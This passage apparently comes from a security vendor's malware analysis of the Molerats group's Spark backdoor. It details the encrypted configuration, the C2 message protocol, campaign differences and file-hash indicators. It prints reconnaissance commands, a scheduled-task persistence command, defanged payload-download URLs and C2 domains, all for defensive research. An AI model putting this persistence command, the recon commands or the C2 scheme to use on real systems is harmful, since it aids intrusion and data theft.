<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. JSON key/value pairs within the payload’s configuration</em></span></p>
<p>The payload also uses this same routine to decrypt an encrypted buffer that contains sleep intervals and more importantly a list of first names used to structure the messages sent to and from the C2 server, as well as the keys used to decrypt these messages. The payload will use the first names listed in Table 4 as JSON key names and values within messages sent to and received from the C2. We provide a description of each element of this decrypted buffer in the Appendix, but also show how the names in Table 4 are used within the C2 communications later in this blog. Each of the values in Table 4 are unique per Spark sample, as the developer changes the names and the keys for each payload.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td>Lawrence</td>
<td>Alanih</td>
<td>Nevaeh</td>
<td>Garrison</td>
<td>ReeceWNM</td>
</tr>
<tr>
<td>Allier</td>
<td>Averizt</td>
<td>LondonzO</td>
<td>Zeke</td>
<td>MorganE</td>
</tr>
<tr>
<td>JaseN</td>
<td>MathiasNbo</td>
<td>JoslynKe</td>
<td>ReesefP</td>
<td>Winston</td>
</tr>
<tr>
<td>Ivory</td>
<td>BrandentlK</td>
<td>AngelxEv</td>
<td>FrederickT</td>
<td>Jessicay</td>
</tr>
<tr>
<td>Jonas</td>
<td>AdalynngS</td>
<td>ZaydenlnL</td>
<td>KaileeXws</td>
<td>VanessaFM</td>
</tr>
<tr>
<td>Reginacy</td>
<td>AdelineRD</td>
<td>Houstonod</td>
<td>EverlyY</td>
<td>Jordanlzw</td>
</tr>
<tr>
<td>TrumanRd</td>
<td>CollinsPM</td>
<td>Maximiliano</td>
<td>CallieVK</td>
<td>Aryana</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 4. First names used by Spark as JSON key/value pairs used for C2 communications</em></span></p>
<p>Before communicating with the C2 server, the payload will decrypt one more buffer that contains strings that the payload uses for debugging messages, as well as the commands it will use to gather system information. Table 5 shows the strings decrypted and their purpose.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td><strong>Decrypted String</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>1</td>
<td>Unknown purpose, but sent to the C2 in the Averizt field</td>
</tr>
<tr>
<td>311OEVZihfReZStoFf4cfg==</td>
<td>Decodes and decrypts to <span style="font-family: 'courier new', courier, monospace;">/c hostname</span> used to obtain the hostname of the system</td>
</tr>
<tr>
<td>Z9Q1WVryAIzLVSxF1yWRwg==</td>
<td>Decodes and decrypts to <span style="font-family: 'courier new', courier, monospace;">%COMSPEC%</span> to get the location of cmd.exe to run commands to gather system information</td>
</tr>
<tr>
<td>P5K5He/2wSGGsvrFPKYpwg4KjBLyTOpbsGJwm1DckoyGK8eXeNMZCQBfHzkYRSjJlGcw6Ckn41X0MY3zJcU65uMvxpABv/g+ttABRJsG7js=</td>
<td>Decodes and decrypts to <span style="font-family: 'courier new', courier, monospace;">/c wmic csproduct get UUID | more +1 | cmd /q /v:on /c "set/p .=&amp;echo(!.!"</span> used to obtain the UUID of the system</td>
</tr>
<tr>
<td>AykC+x26hhd5DfrB/yly9gXcFsIlVxO9</td>
<td>Decodes and decrypts to <span style="font-family: 'courier new', courier, monospace;">/c echo %username%</span> used to obtain the username of the logged in account</td>
</tr>
<tr>
<td>ok</td>
<td>Generic message to indicate a successful execution of a command</td>
</tr>
<tr>
<td>Create Pipe Error</td>
<td>Debug message sent to the C2 if the payload fails to create a pipe to get the results of a command</td>
</tr>
<tr>
<td>Create processa error</td>
<td>Debug message sent to the C2 if the payload fails when creating the process for a command</td>
</tr>
<tr>
<td>Get exit code process error</td>
<td>Debug message sent to the C2 if the payload fails when calling GetExitCodeProcess to get the error message when attempting to create the process for a command</td>
</tr>
<tr>
<td>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_+</td>
<td>Unknown, as it does not appear to be used in the code</td>
</tr>
<tr>
<td>Set handle information error</td>
<td>Debug message sent to the C2 if the payload fails when calling SetHandleInformation when attempting to set the stdout of created process to inherit the object handle</td>
</tr>
<tr>
<td>Wait for single object error</td>
<td>Debug message sent to the C2 if the payload fails when calling WaitForSingleObject after attempting to create the process for a command</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 5. JSON key/value pairs within a buffer that the payload uses to communicate with C2 server</em></span></p>
<h3>Spark C2 Communications</h3>
<p>The payload communicates with its C2 server <span style="font-family: 'courier new', courier, monospace;">laceibagrafica[.]com</span> by issuing HTTP POST requests with base64 encoded and encrypted messages in the data section. We had not seen any previous explanation of this C2 channel, so we will provide an overview of the back and forth communications between the payload and C2 server to show how this payload uses the names in Table 4. To do this analysis, we created a C2 server to interact with the Spark payload to issue commands, so all of the HTTP responses in this section are from the C2 server we created and not an actor developed C2 software. Figure 6 shows an initial beacon sent from the payload to its C2 server. However, all of the outbound requests from the payload to the C2 will look similar visually, as they all use HTTP POST requests to the same URL with encoded and encrypted messages.</p>
<figure id="attachment_105145" aria-describedby="caption-attachment-105145" style="width: 1408px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105145" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-14.png" alt="" width="1408" height="258" /><figcaption id="caption-attachment-105145" class="wp-caption-text">Figure 6.Initial beacon sent from payload to C2 server</figcaption></figure>
<p>The data section in the initial beacon decodes and decrypts to the JSON message <span style="font-family: 'courier new', courier, monospace;">{"CallieVK":"W10=","ReeceWNM":"Jessicay"}</span>. The JSON message involves two key/value pairs with keys “ReeceWNM” and “CallieVK”, whose values transmit the communication type and the data, respectfully. For instance, the “ReeceWNM” key includes the name “<span style="font-family: 'courier new', courier, monospace;">Jessicay</span>” that is used to represent the initial beacon communication type. The payload will decrypt the C2 servers’ response looking for a “<span style="font-family: 'courier new', courier, monospace;">EverlyY</span>” field and uses the value for a sleep interval before continuing. Figure 7 shows a response from the C2 server to the initial beacon, of which the response decrypts to <span style="font-family: 'courier new', courier, monospace;">{"EverlyY": 0}</span>.</p>
<figure id="attachment_105147" aria-describedby="caption-attachment-105147" style="width: 708px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105147" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-15.png" alt="" width="708" height="266" /><figcaption id="caption-attachment-105147" class="wp-caption-text">Figure 7. Initial beacon sent from payload to C2 server</figcaption></figure>
<p>After receiving the <span style="font-family: 'courier new', courier, monospace;">EverlyY</span> response, the payload will gather system information, specifically the username, hostname and the system specific UUID by running the following command line commands using ‘cmd.exe’:</p>
<ol>
<li>wmic csproduct get UUID | more +1 | cmd /q /v:on /c "set/p .=&amp;echo(!.!"</li>
<li>hostname</li>
<li>echo %username%</li>
</ol>
<p>The payload will store each of these command results in JSON in base64 encoded ciphertext within a field name “ZaydenlnL” and using the first name “AngelxEv” to represent the type of data, which is a number that corresponds to the results in the list above with 1 representing the UUID, 2 the hostname and 3 the username. These three JSON objects are added to a JSON array with a name of “Maximiliano” and sent to the C2 server. For example, the payload stores the system information in JSON as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"Maximiliano":[{"AngelxEv":1,"Houstonod":1,"ZaydenlnL":"&lt;base64 encoded ciphertext of UUID&gt;"},{"AngelxEv":3,"Houstonod":1,"ZaydenlnL":"&lt;base64 encoded ciphertext of username&gt;"},{"AngelxEv":2,"Houstonod":1,"ZaydenlnL":"&lt;base64 encoded ciphertext of hostname&gt;"}]}</span></p>
<p>The payload will create an outbound communications JSON object by setting the encoded system information JSON to the “CallieVK” value and setting the “ReeceWNM” value to the communication type “JoslynKe”. The resulting JSON will resemble the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"CallieVK":"&lt;base64 encoded ciphertext of system information “Maximiliano” JSON array&gt;","ReeceWNM":"JoslynKe"}</span></p>
<p>The resulting JSON object is base64 encoded, encrypted and sent within the HTTP POST data to the C2 server, as seen in the example request in Figure 8.</p>
<figure id="attachment_105149" aria-describedby="caption-attachment-105149" style="width: 1576px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105149" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-16.png" alt="" width="1576" height="528" /><figcaption id="caption-attachment-105149" class="wp-caption-text">Figure 8. System information sent from payload to C2 server</figcaption></figure>
<p>After sending the system information, the payload will expect to receive a command from the C2 server within the response. Figure 9 shows the response to this request that contains encrypted data that the payload will parse for commands to execute.</p>
<figure id="attachment_105151" aria-describedby="caption-attachment-105151" style="width: 1584px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105151" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-17.png" alt="" width="1584" height="370" /><figcaption id="caption-attachment-105151" class="wp-caption-text">Figure 9. C2 server response containing ciphertext containing a command line command to execute</figcaption></figure>
<p>The payload does not have a command handler. Rather, it will process the JSON object within the C2’s response for applications to open and/or command line commands to run by calling the CreateProcessW API function. The expected JSON object contains an array named “Jordanlzw” that has one or more objects that will have a task identifier number in a field “Ivory”, an application name to run in a “Alanih” field, and the command line arguments to pass to the application in a “TrumanRd” field. For instance, the decrypted response in Figure 9 contains a JSON object would instruct the payload to run “c:\windows\system32\cmd.exe” using the command line argument “/c whoami”, which effectively runs the “whoami” command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"Aryana": 0, "Jordanlzw" :[{"Ivory" : 5, "Jonas" : true, "Reginacy" : false, "TrumanRd" : "/NKg0zJdCDP1XlK9NJ4eJA==", "Alanih" : "i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=", "LondonzO" : true}]}</span></p>
<p>After running the command provided by the C2, the payload will send a message to the C2 server that we believe is meant to notify the C2 that it received the command by sending the specific task identifier to the server. The payload will notify the C2 using the communication type "MorganE" as seen in the following JSON:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"CallieVK":"eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=","ReeceWNM":"MorganE"}</span></p>
<p>The decoded data within the “CallieVK” field will contain a JSON array with a name of “JaseN” that contains one or more objects with a field name of “Lawrence” that contains the task numbers received, such as <span style="font-family: 'courier new', courier, monospace;">{"JaseN":[{"Lawrence":5}]}</span>. This acknowledgement is sent to the C2 server, as seen in Figure 10:</p>
<figure id="attachment_105153" aria-describedby="caption-attachment-105153" style="width: 1396px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105153" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-18.png" alt="" width="1396" height="324" /><figcaption id="caption-attachment-105153" class="wp-caption-text">Figure 10. Payload notifying the C2 server that it received the command</figcaption></figure>
<p>After acknowledging the receipt of command, the payload expects the C2 to respond with a JSON object with the “Allier” field set to a number, such as <span style="font-family: 'courier new', courier, monospace;">{"Allier" : 7</span>}. We are unsure of the purpose of this transmission or how the payload uses this number value, but Figure 11 shows the base64 encoded ciphertext containing the “Allier” field.</p>
<figure id="attachment_105155" aria-describedby="caption-attachment-105155" style="width: 670px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105155" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-19.png" alt="" width="670" height="248" /><figcaption id="caption-attachment-105155" class="wp-caption-text">Figure 11 C2 server providing the Allier JSON object</figcaption></figure>
<p>After receiving the “Allier” JSON object, the payload will send the results of the executed command(s) to the C2 server. The payload will create a JSON object with an array named “Zeke”, which will contain JSON objects that have a “FrederickT” field used to store the result of the command, a “ReesefP” field to denote the task identifier, and a “KaileeXws” field to store a boolean if the command was successful. The resulting JSON would look like the following when the result of the ‘whoami’ command issued by the C2 is “test-system\&lt;redacted&gt;”:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"Zeke":[{"FrederickT":"5yUu16Ae8WKt&lt;redacted&gt;","KaileeXws":true,"ReesefP":5}]}</span></p>
<p>The payload will base64 encode this data and set the “CallieVK” field in the outbound JSON object with the “ReeceWNM” field set to the “Winston” communication type, as seen in the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"CallieVK":"eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX&lt;redacted&gt;0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=","ReeceWNM":"Winston"}</span></p>
<p>The payload will then encrypt this JSON object and send it to the C2 server to exfiltrate the results of the issued command. Figure 12 shows the HTTP POST request containing the encrypted JSON object that contains the “Winston” communication type.</p>
<figure id="attachment_105157" aria-describedby="caption-attachment-105157" style="width: 1302px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105157" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-20.png" alt="" width="1302" height="396" /><figcaption id="caption-attachment-105157" class="wp-caption-text">Figure 12. Payload sending the results of the issued command to the C2 server</figcaption></figure>
<p>After sending the results of the initial commands, the payload expects the C2 to reply with a JSON object with a “<span style="font-family: 'courier new', courier, monospace;">Garrison</span>” field set to a number, such as “<span style="font-family: 'courier new', courier, monospace;">{"Garrison" : 8}</span>”. Figure 13 shows the C2 server responding with ciphertext of the JSON object with the “<span style="font-family: 'courier new', courier, monospace;">Garrison</span>” field.</p>
<figure id="attachment_105159" aria-describedby="caption-attachment-105159" style="width: 718px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105159" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-21.png" alt="" width="718" height="238" /><figcaption id="caption-attachment-105159" class="wp-caption-text">Figure 13. C2 server sending the Garrison JSON object to the payload</figcaption></figure>
<p>This concludes the check-in and initial command execution portion of the C2. The payload will enter a loop to continuously send HTTP requests to obtain additional commands to run using the same sequence of JSON objects previously explained starting after the “<span style="font-family: 'courier new', courier, monospace;">JoslynKe</span>” communication type that sent the system information to the C2. Instead of sending the system information to the C2 and parsing the response for a command, each iteration of this loop will start with a communication type of “VanessaFM” as seen here:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"CallieVK":"eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm5nUyI6MSwiQ29sbGluc1BNIjoiS1Q2TloyMVNGTVQ5WHFuZVM3MjJmZkVucG1FUFVZcDBqcDFFTXRaVEtyUmNNWkVFWG56QnZnPT0iLCJOZXZhZWgiOnRydWV9XX0=","ReeceWNM":"VanessaFM"}</span></p>
<p>The data in the “<span style="font-family: 'courier new', courier, monospace;">CallieVK</span>” field decodes to a JSON object that has several fields, one of which is an array called “<span style="font-family: 'courier new', courier, monospace;">MathiasNbo</span>” that contains JSON objects that transmit the UUID for the compromised system in a field named “<span style="font-family: 'courier new', courier, monospace;">CollinsPM</span>” that was previously transmitted to the C2 in the “<span style="font-family: 'courier new', courier, monospace;">ZaydenlnL</span>” field of the “<span style="font-family: 'courier new', courier, monospace;">JoslynKe</span>” communication type. The JSON object also contains a field “<span style="font-family: 'courier new', courier, monospace;">AdelineRD</span>” that contains a nickname or campaign identifier value in the form of base64 encoded ciphertext. We have compiled a list of campaign codes of known Spark payloads, which we have included in the Appendix. The resulting JSON object will look like the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"AdelineRD":"vcJbq6nzgJk=","Averizt":"1","BrandentlK":1,"MathiasNbo":[{"AdalynngS":1,"CollinsPM":""&lt;base64 encoded ciphertext of UUID seen in ZaydenlnL field&gt;","Nevaeh":true}]}</span></p>
<p>This JSON is encrypted and base64 encoded and sent to the C2 server, as seen in Figure 14. The payload will use the same JSON each iteration of the main loop and will expect the C2 to provide the same sequence of responses as discussed before that contain “<span style="font-family: 'courier new', courier, monospace;">Jordanlzw</span>”, “<span style="font-family: 'courier new', courier, monospace;">Allier</span>”, and “<span style="font-family: 'courier new', courier, monospace;">Garrison</span>” fields to receive additional commands.</p>
<figure id="attachment_105161" aria-describedby="caption-attachment-105161" style="width: 1510px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105161" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-22.png" alt="" width="1510" height="462" /><figcaption id="caption-attachment-105161" class="wp-caption-text">Figure 14. Payload issuing HTTP POST to C2 server requesting further commands</figcaption></figure>
<h2>Comparison between 2019 and 2020 campaigns</h2>
<p>While collecting additional Spark samples, we found samples from <a href="https://ti.360.net/blog/articles/suspected-molerats-new-attack-in-the-middle-east-en/">a 2019 campaign</a> and newer samples that were compiled in January 2020 used in<a href="https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one"> the Spark Campaign</a>. The delivery documents and Spark payloads used in these campaigns differ from the delivery document we observed in the October and November 2019 attacks. At a high level, the January 2019 delivery document was self-contained as it had its payload embedded within it, while the October 2019, November 2019 and January 2020 delivery documents required interacting with a remote server. The October 2019 and January 2020 documents differ as the former attempts to download a VBScript that downloads a payload from the actor controlled server, whereas the January 2020 document attempts to load a remote template from Google Drive whose macro attempts to download a payload from Google Drive. The known Spark payloads installed by each of these delivery documents differ as well, which we will compare with the known payload from the November attack discussed earlier in this blog.</p>
<p>We analyzed a delivery document from the 2019 campaign and found that it was a macro-enabled Word document (SHA256:<span style="font-family: 'courier new', courier, monospace;">40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11</span>). The macro made the decoy contents by setting a textbox in the document to visible with the line “<span style="font-family: 'courier new', courier, monospace;">Shapes("textbox1").Visible = True</span>”, while the attacks discussed earlier in this blog did not attempt to display any updated decoy contents. Another marked difference is that while both the January and October 2019 delivery documents wrote to a secondary VBScript <span style="font-family: 'courier new', courier, monospace;">%userprofile%\wmsetup.vbs</span> and <span style="font-family: 'courier new', courier, monospace;">programdata\Micorsoft\Microsoft.vbs</span> respectively, the <span style="font-family: 'courier new', courier, monospace;">wmsetup.vbs</span> script contains the binary payload while Microsoft.vbs attempts to download another VBScript that will download the binary payload. The <span style="font-family: 'courier new', courier, monospace;">wmsetup.vbs</span> script decodes an embedded base64 encoded payload (SHA256:<span style="font-family: 'courier new', courier, monospace;">9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db</span></p>
<p>), saves it to <span style="font-family: 'courier new', courier, monospace;">%temp%\ihelp.exe</span> and creates a scheduled task for persistence by running the following command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">schtasks /create /f /sc minute /mo 1 /tn ihelp /tr %temp%\ihelp.exe</span></p>
<p>A few notable characteristics of the Spark payload delivered in January 2019 include the use of different freely-available libraries from other known samples, such as using the <a href="https://github.com/msgpack/msgpack-c">msgpackv1</a> library instead of JSON to structure its configuration and C2 communications, as well as using the <a href="https://github.com/SFML">SFML</a> library instead of cURL. Also, unlike the Spark payload delivered in November 2019, this payload uses the AES cipher to decrypt its configuration and other pertinent strings and to encrypt and decrypt network communications with its C2. It uses the entire SHA256 hash of a supplied key string without using the custom rolling XOR cipher on the key and ciphertext as discussed earlier in this blog. The decrypted configuration from this payload structured using msgpack appears as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">\x88\xa4jevG\xadsmartweb9[.]com\xa3JRk\xa1/\xa3ufRP\xa4qNxp\x00\xa4kfds\xa0\xa4WjaS\x01\xa3WnF\xb8OMfX5GiCmOICUvhunB2lWQ==\xa3sRF\xcd'\x10</span></p>
<p>We also analyzed a delivery document from the 2020 Spark campaign (SHA256:<span style="font-family: 'courier new', courier, monospace;">8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8</span>) and it differed from both the January and October 2019 delivery documents. First, the initial delivery document did not contain a macro, rather it attempts to load a remote template from Google Drive, specifically at the following URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://drive.google.com/uc?export=download&amp;d=1NbCEnL-jA89PWBEhLWwHmBM5nmUKNRS8</span></p>
<p>The remote template (SHA256:<span style="font-family: 'courier new', courier, monospace;">a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367</span>) contains a macro that attempts to download an executable from the following URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxs://drive.google.com/uc?export=download&amp;id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH</span></p>
<p>The executable hosted at the Google Drive link (SHA256:<span style="font-family: 'courier new', courier, monospace;">7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128</span>) is a compiled AutoIt script that attempts to install a Spark backdoor to %userprofile%\runawy.exe, which is the same exact dropper and payload as we observed installed by the “attachment.doc” delivery document discussed earlier in this blog.</p>
<p>Table 6 shows a comparison of features in the Spark payloads discussed in this section. Unfortunately, we were unable to obtain the payload installed by the MOFA-related Word documents delivered in the October 2019 attacks. If we compare the Spark samples installed by the delivery documents in January 2019 and 2020 with the Spark sample installed by the Pictures.pdf delivery document in November 2019, we see notable differences that suggest this threat group is continually developing this backdoor.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 13.8636%;"><strong>Feature</strong></td>
<td style="width: 25.5682%;"><strong>Jan. 2019 Spark</strong></td>
<td style="width: 27.7273%;"><strong>Nov. 2019 Spark (Pictures.pdf)</strong></td>
<td style="width: 31.7045%;"><strong>Oct. and Nov. 2019 “attachment.doc” and Jan. 2020 “The Spark Campaign”</strong></td>
</tr>
<tr>
<td style="width: 13.8636%;">Dropper</td>
<td style="width: 25.5682%;">None</td>
<td style="width: 27.7273%;">Compiled AutoIt script</td>
<td style="width: 31.7045%;">Compiled AutoIt script</td>
</tr>
<tr>
<td style="width: 13.8636%;">HTTP Library</td>
<td style="width: 25.5682%;"><a href="https://github.com/SFML">SFML</a></td>
<td style="width: 27.7273%;"><a href="https://github.com/curl/curl/releases/tag/curl-7_56_0">cURL 7.56.0-DEV</a></td>
<td style="width: 31.7045%;"><a href="https://github.com/elnormous/HTTPRequest">elnormous' HTTPRequest</a></td>
</tr>
<tr>
<td style="width: 13.8636%;">Configuration Structure</td>
<td style="width: 25.5682%;"><a href="https://github.com/msgpack/msgpack-c">msgpack version 1</a></td>
<td style="width: 27.7273%;"><a href="https://github.com/nlohmann/json/releases/tag/v2.1.1">JSON for Modern C++ v2.1.1</a></td>
<td style="width: 31.7045%;"><a href="https://github.com/nlohmann/json/releases/tag/v3.7.0">JSON for Modern C++ v3.7.0</a></td>
</tr>
<tr>
<td style="width: 13.8636%;">Payload Packer</td>
<td style="width: 25.5682%;">Enigma Virtual Box</td>
<td style="width: 27.7273%;">Enigma (5.X)</td>
<td style="width: 31.7045%;">Enigma (5.X)</td>
</tr>
<tr>
<td style="width: 13.8636%;">Cipher used</td>
<td style="width: 25.5682%;">AES on ciphertext</td>
<td style="width: 27.7273%;">Rolling XOR on key and ciphertext + 3DES on ciphertext</td>
<td style="width: 31.7045%;">Rolling XOR on key and ciphertext + custom AES decrypting 16-byte chunks of ciphertext</td>
</tr>
<tr>
<td style="width: 13.8636%;">Encrypted data</td>
<td style="width: 25.5682%;">Configuration, Names for C2 comms, Commands to gather system information</td>
<td style="width: 27.7273%;">Configuration, Names for C2 comms, Commands to gather system information</td>
<td style="width: 31.7045%;">Configuration, Names for C2 comms</td>
</tr>
<tr>
<td style="width: 13.8636%;">Persistence</td>
<td style="width: 25.5682%;">Scheduled task</td>
<td style="width: 27.7273%;">LNK Shortcut in @StartupDir</td>
<td style="width: 31.7045%;">Scheduled task, Copied executable in @StartupDir</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 6. Comparison of Spark payloads delivered in January 2019, October 2019, November 2019 and January 2020</em></span></p>
<h2>Connection to Downeks</h2>
<p><a href="https://securelist.com/gaza-cybergang-group1-operation-sneakypastes/90068/">Kaspersky’s report</a> mentioned the sub-groups of Molerats (AKA the Gaza Cybergang) are responsible for the Operation Parliament campaign that delivered the Spark payload and we observed this threat group <a href="https://unit42.paloaltonetworks.com/unit42-downeks-and-quasar-rat-used-in-recent-targeted-attacks-against-governments/">delivering the Downeks</a> in the DustySky campaign. We observed some similarities between Spark and Downeks from a development and installation perspective.</p>
<p>For instance, we observed the same binder Trojan, which is a malicious application used to open a decoy document and to install a payload, one installing a Downeks payload and two others installing Spark. The binder Trojan installing Downeks was compiled in December 2015 and was used during the DustySky campaign as mentioned in our <a href="https://unit42.paloaltonetworks.com/unit42-downeks-and-quasar-rat-used-in-recent-targeted-attacks-against-governments/">blog</a> (SHA256: <span style="font-family: 'courier new', courier, monospace;">75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9</span>), while we have two samples of this binder Trojan installing Spark samples that were compiled in November 2017 (SHA256:<span style="font-family: 'courier new', courier, monospace;">4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85</span>) and April 2018 (SHA256:<span style="font-family: 'courier new', courier, monospace;">23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c</span>).</p>
<p>From a development perspective, both the Downeks and Spark payloads use libraries and code from several open-source projects available on GitHub to carry out its C2 communications and to structure data in JSON. First, Spark uses the cURL library for C2 communications, specifically version 7.56.0-DEV whose source code is <a href="https://github.com/curl/curl/releases/tag/curl-7_56_0">available on GitHub</a>, while Downeks (SHA256:<span style="font-family: 'courier new', courier, monospace;">9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7</span>) used cURL to communicate with the C2 server, but an earlier version (7.39.0). Second, the payload uses JSON to parse its configuration and to structure its messages sent to and from the C2 server, which it uses JSON for Modern C++ Version 2.1.1 <a href="https://github.com/nlohmann/json/releases/tag/v2.1.1">also available on GitHub</a>. The previously mentioned Downeks also used JSON to parse its configuration and to structure the data it sends and receives from its C2 server. However, it used Tencent’s RapidJSON again <a href="https://github.com/Tencent/rapidjson">freely available on GitHub</a>. This fits our previous observations of the developer of Spark using different JSON libraries within different versions of Spark.</p>
<h2>Conclusion</h2>
<p>Molerats, also known as the Gaza Hacking Team and the Gaza Cybergang, has been targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries between October 2019 through the beginning of December 2019. This group uses spear-phishing emails to deliver both malicious Word and PDF documents, and attempts to social engineer the victim into an infection rather than trying to exploit a software vulnerability. Also, the group uses the Spark backdoor in attacks, but continues to develop this tool using different freely available libraries to structure important data and to carry out C2 communications.</p>
<p>Palo Alto Networks customers are protected from the attacks discussed in this blog by:</p>
<ul>
<li>All known Spark payloads and delivery documents have malicious verdicts in WildFire</li>
<li>All known Spark C2 domains and domains used in the delivery are marked with malicious classifications and verdicts in PANDB and DNS Security</li>
<li>AutoFocus customers can track the delivery documents and payloads with the tags: <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Molerats_Spark">Molerats_Spark</a></li>
</ul>
<h2>Appendix</h2>
<h3>Indicators of Compromise</h3>
<h4>Files related to MOFA documents</h4>
<p>d19104ef4f443e80c21375f1b779f00c960e0193e8aade69d7ad87a11f39c897 - MOFA- 031019.doc<br />
dc3311b3a827840c25689c0e153f2c09ba9583bcf18cdc43b88b12cf9846e94b - Microsoft.vbs<br />
c45b5b01e1c3284fd694db6aa0ebeab8abe78d9bb12eb41b957cd121d97b3516 - PlayerVLC.vbs<br />
03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506 - MOFA- 061019.doc<br />
725d907b33cca8cec22f561068a3a8abf3616a8e2f452adb7fbd4aec20390f06 - Microsoft.vbs</p>
<h4>Files related to Attachment.doc</h4>
<p>eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000 - attachment.doc<br />
7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128 - rundll64.exe<br />
64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431 - runawy.exe</p>
<h4>Files related to Pictures.pdf</h4>
<p>9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495 - Pictures.pdf<br />
1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da - Pictures.rar<br />
92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7 - هذه عينة قليلة من الصور.exe<br />
5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3 - pdf.exe</p>
<h4>Related Spark payloads and Delivery documents</h4>
<p>ee9f90819a578c8256fc950f62bd9f7b051edbee06618a26fa21c2875c3c301e - المذكرة رقم 973 قائمة الحكومة الج (Note No. 973 Government List c)</p>
<p>9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7 - GoogleChrome.vbs</p>
<p>ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8 - MOFA- 101019.doc</p>
<p>4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba - Microsoft.vbs</p>
<p>feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21 - ‮التقرير اليومي حول أهم المستجدات الفلسطينية ليوم‬‭ - 9 - 9 - 2019.doc‬ (Daily report on the most important Palestinian developments, 9-9-2019.doc)</p>
<p>bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959 - التقرير اليومي حول أخر مستجدات الإرهاب العالمي- 9 - 9 - 2019.doc (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc)</p>
<p>243f1301d1d759c17cd49336512ebceb9d347995c90a6e00aff926439d63f12d - Daily Report.rar</p>
<p>602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb</p>
<p>eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000</p>
<p>273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f</p>
<p>71ea0ba573451b14bb411ad28e5aac883f8af0376db8c9d34f309778c901c5d6</p>
